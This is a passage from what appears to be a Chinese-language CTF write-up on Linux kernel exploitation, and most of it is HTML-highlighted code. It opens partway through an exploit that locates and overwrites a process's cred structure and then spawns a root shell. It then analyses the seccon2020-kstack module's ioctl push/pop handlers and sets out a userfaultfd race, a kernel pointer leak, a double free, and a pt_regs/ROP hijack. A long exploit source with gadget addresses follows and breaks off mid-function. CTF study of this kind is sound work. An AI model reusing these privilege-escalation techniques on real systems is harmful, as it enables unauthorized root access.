class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ( (<span class="type">unsigned</span> <span class="type">long</span>)search &lt; (<span class="type">unsigned</span> <span class="type">long</span>)buf+<span class="number">0x8000</span>)&#123;</span><br><span class="line">                search = memmem(search, (<span class="type">unsigned</span> <span class="type">long</span>)buf +<span class="number">0x8000</span>- (<span class="type">unsigned</span> <span class="type">long</span>)search, <span class="string">&quot;0ops0ops0ops&quot;</span>, <span class="number">12</span>);</span><br><span class="line">                <span class="keyword">if</span> ( search == <span class="literal">NULL</span> )<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> ( (search[<span class="number">-2</span>] &gt; PAGE_OFFSET) &amp;&amp; (search[<span class="number">-3</span>] &gt; PAGE_OFFSET )&amp;&amp;(<span class="type">int</span>)search[<span class="number">-58</span>]==pid)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Found cred : %llx\n&quot;</span>,search[<span class="number">-2</span>]);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Found pid: %d\n&quot;</span>,search[<span class="number">-58</span>]);</span><br><span class="line">                    ans=search[<span class="number">-2</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                search+=<span class="number">12</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipefd[<span class="number">1</span>],&amp;ans,<span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipefd[<span class="number">0</span>],&amp;cred_addr,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(cred_addr)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd,KERN_EDITNOTE,cred_addr+<span class="number">4</span>);</span><br><span class="line">    ret=fork();</span><br><span class="line">    <span class="keyword">if</span>(!ret)&#123;</span><br><span class="line">        ret=fork();</span><br><span class="line">        <span class="keyword">if</span>(!ret)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">0</span>,&amp;cpu_set);</span><br><span class="line">            ret=sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15</span>;i++)&#123;</span><br><span class="line">                ioctl(fd,KERN_ADDNOTE,i);</span><br><span class="line">            &#125;</span><br><span class="line">            ioctl(fd,KERN_SELECTNOTE,<span class="number">11</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                ioctl(fd,KERN_DELNOTE,i);</span><br><span class="line">            &#125;</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">1</span>,&amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ioctl(fd,KERN_EDITNOTE,cred_addr+<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>,&amp;cpu_set);</span><br><span class="line">        ret=sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">        u_desc.base_addr=<span class="number">0</span>;</span><br><span class="line">        u_desc.entry_number=<span class="number">2</span>;</span><br><span class="line">        u_desc.limit=<span class="number">0</span>;</span><br><span class="line">        u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">        u_desc.contents=<span class="number">0</span>;</span><br><span class="line">        u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">        u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">        u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">        u_desc.useable=<span class="number">0</span>;</span><br><span class="line">        u_desc.lm=<span class="number">0</span>;</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        ret=syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ret);</span><br><span class="line">        sleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,geteuid());</span><br><span class="line">    setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不太清楚为什么任意写时需先分配 index 为 1~ 15 的 object，并全部释放，选取其中的 <code>index 11</code> 来进行任意写，其他的 index 都会失败，仅分配一个 object 也会失败</p><p>猜测应该是因为还有许多结构体都会从kmalloc-32中取,因此需要较多的object以供选择</p><p>另外最后使用了<code>setreuid(0,0);</code>以及<code>setregid(0,0);</code>全面提权</p><p>以setreuid为例,设置的ruid至少要等于旧cred的uid,euid其中一个</p><p>设置的euid至少要等于旧cred的uid,euid,suid其中一个</p><p>此外还需要绑定cpu以增大成功概率,因为启动脚本中制定了可以有两个核</p><h2 id="seccon2020-kstack"><a href="#seccon2020-kstack" class="headerlink" title="seccon2020-kstack"></a>seccon2020-kstack</h2><h3 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h3><p>启动脚本可以观察出开启了smep,kaslr</p><p>执行<code>cat /sys/devices/system/cpu/vulnerabilities/*</code></p><p>可以观察到开启了kpti</p><h3 id="模块-1"><a href="#模块-1" class="headerlink" title="模块"></a>模块</h3><p>模块只注册了ioctl菜单,其中有两个选项</p><p><strong>0x57AC0001</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a2 == <span class="number">0x57AC0001</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = kmem_cache_alloc(kmalloc_caches[<span class="number">5</span>], <span class="number">6291648LL</span>);</span><br><span class="line">  *(_DWORD *)v8 = v4;</span><br><span class="line">  v9 = head;</span><br><span class="line">  head = v8;</span><br><span class="line">  *(_QWORD *)(v8 + <span class="number">16</span>) = v9;</span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(v8 + <span class="number">8</span>, a3, <span class="number">8LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  head = *(_QWORD *)(v8 + <span class="number">16</span>);</span><br><span class="line">  kfree(v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用head维护了一个单向链表</p><p>一个节点的格式大概如下,v4暂时不知道是什么玩意</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">void</span>            *unknown;</span><br><span class="line">    <span class="type">char</span>             data[<span class="number">8</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>     *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该结构体前八个字节是从 <code>current_task</code> 的某个特殊偏移取的值，经尝试可知为线程组 id</p><p>分配的大小是32</p><p>如果拷贝失败会立即释放obj</p><p><strong>0x57AC0002</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x57AC0002</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v5 = head;</span><br><span class="line">    <span class="keyword">if</span> ( !head )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == *(_DWORD *)head )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !copy_to_user(a3, head + <span class="number">8</span>, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = v5;</span><br><span class="line">        head = *(_QWORD *)(v5 + <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *(_QWORD *)(head + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( *(_DWORD *)v6 != v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v6;</span><br><span class="line">          <span class="keyword">if</span> ( !*(_QWORD *)(v6 + <span class="number">16</span>) )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">          v6 = *(_QWORD *)(v6 + <span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !copy_to_user(a3, v6 + <span class="number">8</span>, <span class="number">8LL</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)(v5 + <span class="number">16</span>) = *(_QWORD *)(v6 + <span class="number">16</span>);</span><br><span class="line">LABEL_12:</span><br><span class="line">          kfree(v6);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>会将同一线程组创建的节点中的头节点删除，并将其 data 拷贝给用户</p><p>若并节点所属线程组与当前进程非同一线程组，则会一直找到那个线程组的节点或是遍历结束为止</p><p>综合来看是实现了一个栈的结构两个功能分别为push和pop</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>ioctl操作没有上锁,以及操作过程中出现的<code>copy_from/to_user</code>,无疑让我们能够想到利用usserfaultfd进行条件竞争</p><p>具体流程如下</p><ol><li>注册一个userfaultfd,监控一块内存<code>leak_page</code>,用以接下来的泄露</li><li>使用shm相关调用,分配并释放一个shm_file_data结构体,从而获得了一个obj+8存在一个内核<code>.text</code>段基址的obj</li><li>调用push来申请一个obj,刚好是先前的shm结构体,但是因为之前注册的userfaultfd,使得停在copy_from_user处,从而没有覆盖obj+8,在注册的监控线程中调用pop操作,使得shm的内容被泄露出来</li><li>注册一个userfaultfd,监控一块内存<code>double_page</code>,用以构造double free</li><li>执行一次push操作,再执行一次pop操作,触发userfaultfd,在监控线程其中再一次pop,构造double free</li><li>注册一个userfaultfd,监控一块内存<code>hijack_page</code>,用以劫持流</li><li>打开一个seq对象,让其取出一个kmalloc-32</li><li>调用setxattr,申请一个kmalloc-32,拷贝的页面横跨两个page,从而使得在拷贝过程中触发userfaultfd,在监控线程中,构造pt_regs并触发</li></ol><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>             dev_fd;</span><br><span class="line"><span class="type">size_t</span>          seq_fd;</span><br><span class="line"><span class="type">size_t</span>          seq_fd_reserve[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>     *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span>   page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">leak_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] push trapped in userfaultfd.&quot;</span>);</span><br><span class="line">        pop(&amp;kernel_offset);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] leak ptr: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">        kernel_offset -= <span class="number">0xffffffff81c37bc0</span>;</span><br><span class="line">        kernel_base += kernel_offset;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">double_free_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] pop trapped in userfaultfd.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] construct the double free...&quot;</span>);</span><br><span class="line">        pop(page);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span>  pop_rdi_ret = <span class="number">0xffffffff81034505</span>;</span><br><span class="line"><span class="type">size_t</span>  xchg_rax_rdi_ret = <span class="number">0xffffffff81d8df6d</span>;</span><br><span class="line"><span class="type">size_t</span>  mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff8121f89a</span>;</span><br><span class="line"><span class="type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81600a34</span>;</span><br><span class="line"><span class="type">long</span>    flag_fd;</span><br><span class="line"><span class="type">char</span>    flag_buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">hijack_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span 